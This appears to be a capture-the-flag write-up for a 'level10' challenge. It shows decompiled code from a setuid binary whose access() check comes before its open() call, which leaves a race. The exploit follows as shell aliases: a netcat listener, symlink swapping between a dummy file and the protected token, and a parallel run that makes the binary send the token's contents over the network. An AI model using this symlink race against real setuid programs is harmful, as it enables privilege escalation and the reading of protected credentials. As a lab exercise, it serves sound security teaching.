At the home directory there is a program level10 and a file token.

-rwsr-sr-x+ 1 flag10  level10 10817 Mar  5  2016 level10
-rw-------  1 flag10  flag10     26 Mar  5  2016 token

The user level10 can't read token, and the program as a setuid to flag10.

In the binary of the file we can see :

Test the access to the file
```
pcVar6 = in_stack_00000008[1];
param1 = in_stack_00000008[2];
iVar2 = access(in_stack_00000008[1],4);
```

Then connect to the address:
```
 local_24.sa_data._2_4_ = inet_addr(param1);
    uVar1 = htons(0x1b39);
    local_24.sa_data._0_2_ = uVar1;
    iVar3 = connect(iVar2,&local_24,0x10);
```

And finnaly open the file:
```
 iVar3 = open(pcVar6,0);
    if (iVar3 == -1) {
      puts("Damn. Unable to open file");
                    /* WARNING: Subroutine does not return */
      exit(1);
    }
    __n = read(iVar3,local_1024,0x1000);
```

The offset between the verification of the read write and the openning of the fd is letting us
the time to change the file in order to pen an other file than the one verified.

To resolve this exercice i used several command to achieve the race condition :

First i need to listen at the port 6969 :
 > alias listen="nc -l 6969"

Then i need to set a link to a file wich can be readed by level10 user.
 > alias reset="touch /tmp/dummy ; ln -sf /tmp/dummy /tmp/link"

I need to start the program level10 to send the value of token to 127.0.0.1
 > alias send="./level10 /tmp/link 127.0.0.1"

And i need to change the file that is linked by /tmp/link between the verification and the open:
 > alias race="ln -sf token /tmp/link"


The final command combine everything, and execute parrallel listen send and race:
 > listen & reset ; send & race
